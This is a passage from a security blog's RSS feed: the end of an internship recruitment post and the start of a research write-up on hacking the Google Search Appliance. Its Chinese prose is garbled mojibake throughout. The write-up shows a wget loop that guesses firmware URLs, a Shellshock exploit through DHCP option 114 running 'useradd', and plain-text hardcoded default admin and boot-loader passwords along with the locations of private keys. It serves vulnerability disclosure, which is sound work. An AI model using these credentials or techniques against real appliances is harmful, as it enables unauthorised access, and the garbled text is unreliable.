&lt;ul&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπ&lt;/li&gt;
  &lt;li&gt;Á∞°Á≠îÈ°åÁ≠îÊ°à
    &lt;ul&gt;
      &lt;li&gt;È°åÁõÆ 1ÔºöË´ãÊèêÂá∫‰∏âÂÄãÔºå‰Ω†Âç∞Ë±°ÊúÄÊ∑±ÂàªÊàñÊÑüÂà∞ÊúâË∂£„ÄÅÊñºË•øÂÖÉ 2021 ~ 2023 Âπ¥ÈñìÂÖ¨ÈñãÁöÑÁúüÂØ¶ÊºèÊ¥ûÊàñÊîªÊìäÈèàÊ°à‰æãÔºå‰∏¶‰æùËá™Â∑±ÁöÑÁêÜËß£Á∞°Ëø∞Ë™™ÊòéÂêÑÂÄãÊºèÊ¥ûÁöÑÊàêÂõ†„ÄÅÂà©Áî®Ê¢ù‰ª∂ÂíåÂèØ‰ª•ÈÄ†ÊàêÁöÑÂΩ±Èüø„ÄÇ&lt;/li&gt;
      &lt;li&gt;È°åÁõÆ 2ÔºöÂØ¶ÁøíÊúüÈñìÊÉ≥Ë¶ÅÁ†îÁ©∂ÁöÑ‰∏ªÈ°åÔºåË´ãÊèêÂá∫‰∏âÂÄãÂèØËÉΩÈÅ∏ÊìáÁöÑÊòéÁ¢∫‰∏ªÈ°åÔºå‰∏¶Á∞°ÂñÆË™™ÊòéÊèêÂá∫ÁöÑÁêÜÁî±ÊàñÊÉ≥ÂÆåÊàêÁöÑÂÖßÂÆπÔºå‰æãÂ¶ÇÔºö
        &lt;ul&gt;
          &lt;li&gt;Á†îÁ©∂‚óØ‚óØÈñãÊ∫êËªüÈ´îÔºåÊâæÂà∞ÂèØ RCE ÁöÑÈáçÂ§ßÈ¢®Èö™Âº±Èªû„ÄÇ&lt;/li&gt;
          &lt;li&gt;Á†îÁ©∂ AD CS ÁöÑÊîªÊìäÊâãÊ≥ïÔºåÂòóË©¶ÊåñÊéòÊñ∞ÁöÑÊîªÊìäÂèØËÉΩÊÄßÊàñÂêëÈáè„ÄÇ&lt;/li&gt;
          &lt;li&gt;Á†îÁ©∂Â∏∏Ë¶ãÁöÑË∑ØÁî±Âô®ÔºåÁõÆÊ®ôÂåÖÊã¨ÔºöAA-123 Ë∑ØÁî±Âô®„ÄÅBB-456 ÁÑ°Á∑öË∑ØÁî±Âô®„ÄÇ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Êú¨ÈöéÊÆµÊî∂‰ª∂Êà™Ê≠¢ÊôÇÈñìÁÇ∫ &lt;strong&gt;2023/08/11 23:59&lt;/strong&gt;ÔºåÊàëÂÄëÊúÉÊ†πÊìöÊÇ®ÁöÑÂ±•Ê≠∑ÂèäÈ°åÁõÆÊâÄÂõûÁ≠îÁöÑÂÖßÂÆπ‰æÜÊ±∫ÂÆöÊòØÂê¶ÊúâÈÄöÈÅéÁ¨¨‰∏ÄÈöéÊÆµÔºåÊàëÂÄëÊúÉÂú® 10 ÂÄã&lt;strong&gt;Â∑•‰ΩúÂ§©&lt;/strong&gt;ÂÖßÂõûË¶Ü„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∫åÈöéÊÆµÈù¢Ë©¶&quot;&gt;Á¨¨‰∫åÈöéÊÆµÔºöÈù¢Ë©¶&lt;/h4&gt;
&lt;p&gt;Ê≠§ÈöéÊÆµÁÇ∫ 30~120 ÂàÜÈêòÔºà‰æùÁÖßÁµÑÂà•ÈúÄÊ±ÇËÄåÂÆöÔºåÊúÉÂè¶Ë°åÈÄöÁü•ÔºâÁöÑÈù¢Ë©¶ÔºåÊúÉÊúâ 2~3 ‰ΩçË≥áÊ∑±Â§•‰º¥ÂèÉËàáÔºåË©ï‰º∞ÊÇ®ÊòØÂê¶ÂÖ∑ÂÇôÊú¨Ê¨°ÂØ¶ÁøíÊâÄÈúÄÁöÑÊäÄË°ìËÉΩÂäõËàá‰∫∫Ê†ºÁâπË≥™„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ÊôÇÈñìËª∏&quot;&gt;ÊôÇÈñìËª∏&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2023/07/19 - 2023/08/11 ÂÖ¨ÈñãÊãõÂãü&lt;/li&gt;
  &lt;li&gt;2023/08/14 - 2023/08/24 Èù¢Ë©¶&lt;/li&gt;
  &lt;li&gt;2023/08/28 ÂâçÂõûÊáâÁµêÊûú&lt;/li&gt;
  &lt;li&gt;2023/09/04 Á¨¨ÂõõÂ±ÜÂØ¶ÁøíË®àÁï´ÊñºÁï∂ÈÄ±ÈñãÂßã&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â†±ÂêçÊñπÂºè&quot;&gt;Â†±ÂêçÊñπÂºè&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Ë´ãÂ∞áÊÇ®ÁöÑ&lt;strong&gt;Â±•Ê≠∑&lt;/strong&gt;Âèä&lt;strong&gt;È°åÁõÆÁ≠îÊ°à&lt;/strong&gt;‰ª• PDF Ê†ºÂºèÂØÑÂà∞ recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;Â±•Ê≠∑Ê†ºÂºèË´ãÂèÉËÄÉÁØÑ‰æãÁ§∫ÊÑèÔºà&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;Ôºâ‰∏¶ËΩâÊàê PDF„ÄÇËã•ÊÇ®ÊúâËá™‰ø°Ôºå‰πüÂèØ‰ª•Ëá™Áî±ÁôºÊèÆÊúÄËÉΩÂëàÁèæÊÇ®ËÉΩÂäõÁöÑÂ±•Ê≠∑„ÄÇ&lt;/li&gt;
      &lt;li&gt;Ë´ãÊñº &lt;strong&gt;2023/08/11 23:59&lt;/strong&gt; ÂâçÂØÑÂá∫ÔºàÂ¶ÇÊûúÂêçÈ°çÂ∑≤ÊªøÂâáË¶ñÊÉÖÊ≥ÅÊèêÊó©ÁµêÊùüÔºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‰ø°‰ª∂Ê®ôÈ°åÊ†ºÂºèÔºö[ÊáâÂæµ] ËÅ∑‰Ωç ÊÇ®ÁöÑÂßìÂêçÔºàÁØÑ‰æãÔºö[ÊáâÂæµ] Web ÁµÑÂØ¶ÁøíÁîü ÁéãÂ∞èÁæéÔºâ&lt;/li&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπË´ãÂãôÂøÖÊéßÂà∂Âú®‰∏âÈ†Å‰ª•ÂÖßÔºåËá≥Â∞ëÈúÄÂåÖÂê´‰ª•‰∏ãÂÖßÂÆπÔºö
    &lt;ul&gt;
      &lt;li&gt;Âü∫Êú¨Ë≥áÊñô&lt;/li&gt;
      &lt;li&gt;Â≠∏Ê≠∑&lt;/li&gt;
      &lt;li&gt;ÂØ¶ÁøíÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;Á§æÁæ§Ê¥ªÂãïÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;ÁâπÊÆä‰∫ãËπü&lt;/li&gt;
      &lt;li&gt;ÈÅéÂéªÂ∞çÊñºË≥áÂÆâÁöÑÁõ∏ÈóúÁ†îÁ©∂&lt;/li&gt;
      &lt;li&gt;MBTI ËÅ∑Ê•≠ÊÄßÊ†ºÊ∏¨Ë©¶ÁµêÊûúÔºà&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;Ê∏¨Ë©¶Á∂≤È†Å&lt;/a&gt;Ôºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ëã•ÊúâÊáâÂæµÁõ∏ÈóúÂïèÈ°åÔºåË´ã‰∏ÄÂæã‰ΩøÁî® Email ËÅØÁπ´ÔºåÂ¶ÇÈÄ†ÊàêÊÇ®ÁöÑ‰∏ç‰æøË´ãË¶ãË´íÔºåÊàëÂÄëÊÑüË¨ùÊÇ®ÁöÑ‰æÜ‰ø°Ôºå‰∏¶ÊúüÂæÖÊÇ®ÁöÑÂä†ÂÖ•ÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/07/18/4nd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2023/07/18/4nd-internship-program-recruit</guid>
                <pubDate>Tue, 18 Jul 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[REL] Ê∑±ÂÖ•Á†¥Ëß£ Google Search Appliance</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;Êá∂‰∫∫ÂåÖ&quot;&gt;Êá∂‰∫∫ÂåÖ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;GSA ÁÆ°ÁêÜÁïåÈù¢Ë™çË≠âÂæå‰ªªÊÑèÊåá‰ª§Âü∑Ë°å&lt;/li&gt;
  &lt;li&gt;GSA ÊêúÂ∞ã‰ªãÈù¢‰ªªÊÑèËÆÄÊ™î&lt;/li&gt;
  &lt;li&gt;GSA ‰ΩøÁî® Oracle ÁöÑ Outside-in Technology ËΩâÊèõÊñá‰ª∂Ê†ºÂºè&lt;/li&gt;
  &lt;li&gt;Google Á∂≤È†ÅÊúçÂãôÊúâ‰∏Ä‰∫õÂõ∫ÂÆöÁöÑURIÔºåÊúÉÊèê‰æõÊ≠§ÊúçÂãôÁöÑËá™Ë∫´Ë≥áË®ä&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h3&gt;

&lt;p&gt;Google Search Appliance (‰ª•‰∏ãÁ∞°Á®± GSA ) ÊòØ Google Êñº2002 Âπ¥ÈñãÂßãÁÇ∫‰ºÅÊ•≠Êé®Âá∫ÁöÑÊêúÂ∞ãË®≠ÂÇôÔºå‰∏ªË¶ÅÂäüËÉΩÁÇ∫ÊîæÁΩÆÊñº‰ºÅÊ•≠ÂÖßÁ∂≤Áî®ÊñºÁ¥¢ÂºïÂÖßÈÉ®Á∂≤Ë∑ØË≥áË®ä‰∏¶Êèê‰æõÊ™¢Á¥¢„ÄÇÊñº 2005 Âπ¥Â∑¶Âè≥Êé®Âá∫Áµ¶ÂÄã‰∫∫ÂèäÂ∞èÂûã‰ºÅÊ•≠‰ΩøÁî®ÁöÑ Google MiniÔºåÊñº 2008 Âπ¥Â∫ïÂ∑¶Âè≥ÊúâÁôºÂ∏ÉËôõÊì¨Ê©üÂô®ÁâàÊú¨ÔºåÂêçÁ®±ÁÇ∫ Virtual Google Search Appliance (‰ª•‰∏ãÁ∞°Á®± vGSA)ÔºåÂæå‰æÜÊñº 2018Âπ¥Â∫ïÁµêÊùüÁî¢ÂìÅÁîüÂëΩÈÄ±ÊúüÔºåÁî¢ÂìÅÁ∑öÊï¥ÂêàÈÄ≤ÂÖ• Cloud Search„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Ë®≠ÂÇôËªüÈ´îÂèñÂæó&quot;&gt;Ë®≠ÂÇô„ÄÅËªüÈ´îÂèñÂæó&lt;/h3&gt;

&lt;p&gt;Âæû ebay ‰ª•ÈóúÈçµÂ≠ó Google Search Appliance ÊêúÂ∞ã‰∏¶ÂòóË©¶Ë≥ºË≤∑Ê≠§Ë®≠ÂÇôÔºå
Â¶ÇÊûú‰∏çÂπ∏Á°¨Á¢üË≥áÊñôÂ∑≤Ë¢´Ê∏ÖÈô§Ôºå‰πüÂè™ËÉΩÂòóË©¶Â§öË≤∑ÂπæÂè∞‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;Âπ∏ÈÅãÁöÑÊòØÔºåË≥ºÂÖ•ÁöÑÁ¨¨‰∏ÄÂè∞Â∞±ÊòØÊú™ÈÅ≠ÂÆåÊï¥Ê∏ÖÈô§ÁöÑ GSAÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÁèæÂú®‰ªçÁÑ∂ÂèØ‰ª•ÊâæÂà∞Ê≠£Âú®Ë¢´Ë≤©ÂîÆÁöÑË®≠ÂÇôÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âè¶‰∏ÄÊñπÈù¢ vGSA ÂéüÂßãÂÖ¨ÈñãÈÄ£ÁµêÂ∑≤Ë¢´ÁßªÈô§Ôºå
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/vgsa/vgsa\_20090210.7z&lt;/code&gt; [Â∑≤Ë¢´ÁßªÈô§]
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/vgsa/vgsa\_20081028.7z&lt;/code&gt; [Â∑≤Ë¢´ÁßªÈô§]&lt;/p&gt;

&lt;p&gt;Âæå‰æÜÁî® BitTorrent Á£ÅÂäõÈÄ£Áµê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magnet:?xt=urn:btih:89388ACE8C3B91FDD3A2F86D8CBB78C58A70D992&lt;/code&gt; ÊàêÂäüÂèñÂæóÊ™îÊ°à„ÄÇ&lt;/p&gt;

&lt;p&gt;Êé•ËëóÂÜçÂæû google groups ‰∏≠ÊâæÂà∞ËàäÁâàËªüÈ´îÈÄ£Êé•Ôºö&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄ£ÁµêÁÇ∫Ôºö&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/dl/enterprise/install_bundle-10000622-7.2.0-112.bin&lt;/code&gt; [Â∑≤Ë¢´ÁßªÈô§]&lt;/p&gt;

&lt;p&gt;Áî±ÂÖ¨ÈñãÁ∂≤È†Å‰∏≠ÔºåÂèØÂèñÂæóÁâàÊú¨ËôüÁ¢ºÔºö
&lt;a href=&quot;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&quot;&gt;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÁåúÊ∏¨Ê™îÊ°àÂêçÁ®±Ë¶èÂâáÁÇ∫ install_bundle-10000(‰∏â‰ΩçÊï∏Â≠ó)-7.(‰∏Ä‰ΩçÊï∏Â≠ó).(Êï∏Â≠ó)-(‰∏â‰ΩçÊï∏Â≠ó).bin&lt;/p&gt;

&lt;p&gt;‰∏¶Á∑®ÂØ´ shell script ÂòóË©¶‰∏ãËºâÔºö&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;622&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.2.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;661&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.4.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;693&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.6.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Âä†‰∏äÁ∂≤Ë∑ØÊêúÂ∞ãÂà∞ÁöÑË≥áÊñôÔºåÊàêÂäüÂèñÂõû‰ª•‰∏ãÊ™îÊ°àÔºö&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;all_langs-lang-pack-2.1-1.bin
all_langs-lang-pack-2.2-1.bin
centos_patch_files-6.0.0-22.bin
centos_patch_files-6.14.0-28.bin
centos_patch_files-7.0.14-238.bin
centos_patch_files-7.2.0-252.bin
centos_patch_files-7.2.0-264.bin
centos_patch_files-7.2.0-270.bin
centos_patch_files-7.2.0-280.bin
centos_patch_files-7.2.0-286.bin
install_bundle-10000653-7.2.0-252.bin
install_bundle-10000658-7.2.0-264.bin
install_bundle-10000661-7.2.0-270.bin
install_bundle-10000681-7.4.0-64.bin
install_bundle-10000685-7.4.0-72.bin
install_bundle-10000686-7.4.0-74.bin
install_bundle-10000692-7.4.0-82.bin
install_bundle-10000762-7.6.0-36.bin
install_bundle-10000767-7.6.0-42.bin
install_bundle-10000772-7.6.0-46.bin
install_bundle-10000781-7.6.0-58.bin
install_bundle-10000810-7.6.50-30.bin
install_bundle-10000822-7.6.50-36.bin
install_bundle-10000855-7.6.50-64.bin
install_bundle-10000878-7.6.250-12.bin
install_bundle-10000888-7.6.250-20.bin
install_bundle-10000901-7.6.250-26.bin
install_bundle-10000915-7.6.360-10.bin
install_bundle-10000926-7.6.360-16.bin
install_bundle-10000967-7.6.512-18.bin
sw_files-5.0.4-22.bin
sw_files-6.14.0-28.bin
sw_files-7.0.14-238.bin
vm_patch_1_for_504_G22_and_G24_only.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;vgsa-virtual-google-search-appliance&quot;&gt;vGSA (Virtual Google Search Appliance)&lt;/h3&gt;

&lt;p&gt;Êé•ËëóÈñãÂßã VGSA ÁöÑÁ†îÁ©∂ÔºåÈ†êË®≠ÊÉÖÊ≥Å‰∏ãÂÆåÊàêÂåØÂÖ•ËôõÊì¨Ê©üÂæåÊ≠§Á≥ªÁµ±Âè™Êèê‰æõ‰∫Ü‰∏ÄÂÄãÁ∂≤Ë∑ØË®≠ÂÆöÁöÑÂäüËÉΩÔºå
Ê≤íÊúâÊèê‰æõ shell ÂèØ‰æõÊìç‰Ωú‰ΩøÁî®„ÄÇ‰ΩÜÊòØÁî±ÊñºËôõÊì¨Ê©üÂô®ÊòØÂü∑Ë°åÂú®Ëá™Â∑±Áí∞Â¢É‰∏äÔºå
ÊâÄ‰ª•ÈÄöÂ∏∏ÂèØ‰ª•ÈÄèÈÅé‰∏ãÂàóÊñπÂºèÂèñÂæóÁ≥ªÁµ±Ê¨äÈôêÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Áõ¥Êé•‰øÆÊîπÊú™Âä†ÂØÜÁöÑÁ£ÅÁ¢üÊ©üÊ™îÊ°à&lt;/li&gt;
  &lt;li&gt;‰øÆÊîπËôõÊì¨Ê©üË®òÊÜ∂È´îÂÖßÂÆπ&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî®ÂÖ∂‰ªñ‰ΩúÊ•≠Á≥ªÁµ±ÂÖâÁ¢üÊàñÁ£ÅÁ¢üÈñãÊ©ü&lt;/li&gt;
  &lt;li&gt;ÂÖ∂‰ªñÂ∑≤Áü•ÊºèÊ¥û&lt;/li&gt;
  &lt;li&gt;ÂØ´Ê≠ªÁöÑÁÆ°ÁêÜÂì°ÊàñÁ≥ªÁµ±Â∏≥Ëôü„ÄÅÂØÜÁ¢º&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰∏ãÂúñÁÇ∫ vGSA Á∂≤Ë∑ØË®≠ÂÆöÁï´Èù¢Ôºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;cve-2014-6271&quot;&gt;CVE-2014-6271&lt;/h4&gt;

&lt;p&gt;Áï∂Ê∏¨Ë©¶Êó©ÊúüÁöÑ Linux Ë®≠ÂÇôÂèäÊúçÂãôÔºåÂ∞§ÂÖ∂ÊòØ‰ΩøÁî® RedHat Á≥ªÂàóÁöÑ‰ΩúÊ•≠Á≥ªÁµ±ÊôÇÔºåÈÄöÂ∏∏ÊúÉÊúâ Shellshock ÁöÑÊºèÊ¥ûÔºå
ËÄåÁôºÂ∏ÉÊó•ÊúüÂÜç2008ÁöÑ vGSA ‰πü‰∏ç‰æãÂ§ñ„ÄÇdhcp server ‰∏≠ÊèíÂÖ• option 114 ÊúÉË¢´Ë®≠ÁΩÆÊñºÁí∞Â¢ÉËÆäÊï∏ÔºåÂæûËÄåËß∏ÁôºÊºèÊ¥ûÔºåÂü∑Ë°å‰ªªÊÑèÊåá‰ª§Ôºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Êåá‰ª§ÁÇ∫Ôºö&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useradd zzzzgsa&lt;/code&gt;ÔºåÂèØ‰ª•Âæû‰∏ªÊéßÂè∞Ëº∏Âá∫‰∏≠ÁúãÂà∞Ê≠§Êåá‰ª§Ë¢´ÈáçË§áÂü∑Ë°åÔºå‰∏¶Áî¢ÁîüÈåØË™§Ë®äÊÅØ„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;vgsa-ËßÄÂØü&quot;&gt;vGSA ËßÄÂØü&lt;/h4&gt;

&lt;p&gt;ÊàêÂäüÂèñÂæó‰ΩúÊ•≠Á≥ªÁµ±Ê¨äÈôêÂæåÔºåÈÄ≤Ë°åÁ∂≤Ë∑ØÁí∞Â¢É„ÄÅÂü∑Ë°åÁ®ãÂºè„ÄÅÊ™îÊ°àÁ≥ªÁµ±ÁöÑËßÄÂØüÔºå‰ª•‰∏ãÊòØ‰ΩúÊ•≠Á≥ªÁµ±Áí∞Â¢ÉËßÄÂØüÂøÉÂæóÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÁâàÊú¨ËôüÁÇ∫ 5.2.0.G.27„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊúçÂãô‰∏ªË¶ÅÁî± C/C++„ÄÅjava„ÄÅpython Á∑®ÂØ´&lt;/li&gt;
  &lt;li&gt;/export/hda3 ‰ºº‰πéÊòØÊúçÂãô‰∏ªË¶Å‰ΩøÁî®ÁöÑÁõÆÈåÑ&lt;/li&gt;
  &lt;li&gt;/etc/shadow Â≠òÂú®Â∏≥Ëôü root„ÄÅÂØÜÁ¢ºÈõúÊπäÁÇ∫ x‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñàM&lt;/li&gt;
  &lt;li&gt;ÁÆ°ÁêÜ‰ªãÈù¢ 8000„ÄÅ8443 È†êË®≠ÁÆ°ÁêÜÂØÜÁ¢ºÁÇ∫ j0njlRXpU5CQ&lt;/li&gt;
  &lt;li&gt;/.gnupg Â≠òÂú® ent_box_key ÂÖ¨ÁßÅÈë∞„ÄÇ&lt;/li&gt;
  &lt;li&gt;/.gnupg Â≠òÂú® google_license_key ÂÖ¨Èë∞„ÄÇ&lt;/li&gt;
  &lt;li&gt;/.ssh/authorized_keys Â≠òÂú®ÂÖ©ÁµÑÂÖ¨Èë∞„ÄÇ&lt;/li&gt;
  &lt;li&gt;/root/.ssh/authorized_keys Â≠òÂú®‰∏ÄÁµÑÂÖ¨Èë∞„ÄÇ&lt;/li&gt;
  &lt;li&gt;/root/.ssh/ Â≠òÂú®ÂÖ©ÁµÑssh ÂÖ¨ÁßÅÈë∞„ÄÇ&lt;/li&gt;
  &lt;li&gt;/root/.gnupg/ Â≠òÂú® ent_box_key ÂÖ¨ÁßÅÈë∞„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî® Oracle ÂÖ¨Âè∏ÁöÑ Outside In Technology Â∞áÊñá‰ª∂ËΩâÊèõÁÇ∫ htmlÁ∂≤È†Å„ÄÇ&lt;/li&gt;
  &lt;li&gt;java Âü∑Ë°åÁí∞Â¢É‰ΩøÁî® Security Manager ‰øùË≠∑„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ë´ãÊ±ÇÂ∑•Á®ãÂ∏´ÊîØÊè¥ÂäüËÉΩ‰ΩøÁî® ppp Âª∫ÊßãËôõÊì¨ÁßÅÊúâÁ∂≤Ë∑ØÔºå /etc/ppp/chap-secrets Â≠òÊúâÂ∏≥ËôüÂØÜÁ¢º ( z‚ñà‚ñà‚ñà‚ñà‚ñà‚ñàc„ÄÅ]‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñàT )&lt;/li&gt;
  &lt;li&gt;/etc/lilo.conf‰∏≠ÁöÑÈñãÊ©üÈÅ∏ÂñÆÂØÜÁ¢ºÁÇ∫ cmBalx7&lt;/li&gt;
